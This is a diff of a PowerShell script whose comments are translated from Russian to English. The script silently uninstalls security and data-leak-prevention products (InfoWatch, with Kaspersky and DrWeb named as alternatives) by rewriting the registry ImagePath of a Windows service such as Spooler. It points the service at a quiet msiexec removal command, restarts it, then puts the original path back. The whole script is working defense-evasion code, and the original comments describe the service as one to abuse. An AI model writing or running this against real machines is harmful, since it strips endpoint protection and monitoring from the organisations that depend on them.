@@ -1,12 +1,13 @@
-# A PowerShell script that uninstalls a specified software product by temporarily modifying a Windows service's ImagePath to trigger the uninstallation process via msiexec.exe, then restores the original service path.
+# A PowerShell script that uninstalls a specified software product by temporarily modifying a Windows service's 
+# ImagePath to trigger the uninstallation process via msiexec.exe, then restores the original service path.
 
-# --- Настройки ---
-$ProductName = "InfoWatch"          # ← Меняй на "Kaspersky", "DrWeb" и т.п.
-$ServiceName   = "Spooler"          # Служба для abuse (Spooler, upnphost, wuauserv...)
-$MaxWait       = 90                 # Макс. время ожидания удаления (сек)
-$CheckInterval = 5                  # Интервал проверки (сек)
+# --- Settings ---
+$ProductName = "InfoWatch"          # Specify product to uninstall (e.g., "Kaspersky", "DrWeb")
+$ServiceName = "Spooler"            # Service to use for uninstall (e.g., Spooler, upnphost, wuauserv)
+$MaxWait = 90                       # Maximum wait time for uninstall (seconds)
+$CheckInterval = 5                  # Check interval (seconds)
 
-# --- Функция: проверяем, установлен ли продукт ---
+# --- Function: Check if product is installed ---
 function Test-ProductInstalled {
     param(
         [string]$Name
@@ -22,7 +23,7 @@ function Test-ProductInstalled {
     return $false
 }
 
-# --- 1. Получаем оригинальный путь службы ---
+# --- 1. Get original service path ---
 $OriginalPath = (Get-WmiObject -Class Win32_Service -Filter "Name='$ServiceName'").PathName
 if (-not $OriginalPath) {
     Write-Error "Service '$ServiceName' not found or access denied."
@@ -30,7 +31,7 @@ if (-not $OriginalPath) {
 }
 Write-Host "[*] Original service path: $OriginalPath" -ForegroundColor Cyan
 
-# --- 2. Ищем GUID продукта ---
+# --- 2. Find product GUID ---
 $UninstallKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
 $SubKeys = Get-ChildItem -Path $UninstallKey -ErrorAction SilentlyContinue
 $GUID = $null
@@ -49,18 +50,18 @@ if (-not $GUID) {
 
 Write-Host "[*] Found $ProductName GUID: $GUID" -ForegroundColor Green
 
-# --- 3. Формируем команду удаления ---
+# --- 3. Construct uninstall command ---
 $InnerCommand = "msiexec.exe /x $GUID /qn /norestart"
 $NewImagePath = "cmd.exe /c $InnerCommand"
 
 Write-Host "[*] Setting ImagePath to trigger uninstall..." -ForegroundColor Yellow
 
-# --- 4. Меняем ImagePath через реестр ---
+# --- 4. Modify ImagePath in registry ---
 $regPath = "HKLM\SYSTEM\CurrentControlSet\Services\$ServiceName"
 $regCmd = "reg add `"$regPath`" /v ImagePath /t REG_EXPAND_SZ /d `"$NewImagePath`" /f"
 Invoke-Expression $regCmd | Out-Null
 
-# --- 5. Останавливаем и запускаем службу ---
+# --- 5. Stop and start service ---
 Write-Host "[*] Stopping $ServiceName..." -ForegroundColor Yellow
 sc.exe stop "$ServiceName" | Out-Null
 Start-Sleep -Seconds 3
@@ -68,7 +69,7 @@ Start-Sleep -Seconds 3
 Write-Host "[*] Starting $ServiceName — uninstalling $ProductName..." -ForegroundColor Green
 sc.exe start "$ServiceName" | Out-Null
 
-# --- 6. Ждём, пока продукт исчезнет ---
+# --- 6. Wait for uninstall to complete ---
 $elapsed = 0
 Write-Host "[⏳] Waiting for uninstall to complete..." -ForegroundColor Yellow
 
@@ -88,12 +89,12 @@ if ($elapsed -ge $MaxWait) {
     Write-Warning "Timeout reached. Uninstall may have failed or is still running."
 }
 
-# --- 7. Восстанавливаем оригинальный путь ---
+# --- 7. Restore original ImagePath ---
 Write-Host "[*] Restoring original ImagePath..." -ForegroundColor Yellow
 $restoreCmd = "reg add `"$regPath`" /v ImagePath /t REG_EXPAND_SZ /d `"$OriginalPath`" /f"
 Invoke-Expression $restoreCmd | Out-Null
 
-# Перезапускаем службу
+# Restart service
 sc.exe stop "$ServiceName" | Out-Null
 Start-Sleep -Seconds 2
 sc.exe start "$ServiceName" | Out-Null
